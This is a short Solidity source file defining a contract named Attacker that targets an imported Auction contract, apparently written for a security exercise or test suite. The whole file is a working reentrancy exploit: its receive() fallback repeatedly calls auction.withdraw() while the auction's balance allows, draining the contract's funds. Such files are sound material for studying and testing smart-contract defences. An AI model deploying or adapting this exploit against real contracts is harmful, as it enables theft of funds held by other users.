// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.20;

import {Auction} from "./Auction.sol";

contract Attacker {
    Auction private auction;

    constructor(address auctionAddress) {
        auction = Auction(auctionAddress);
    }

    function placeBid() external payable {
        auction.bid{value: msg.value}();
    }

    function attack() external {
        auction.withdraw();
    }

    receive() external payable {
        // Recursively call withdraw while possible
        if (address(auction).balance >= auction.highestBid()) {
            auction.withdraw();
        }
    }
}
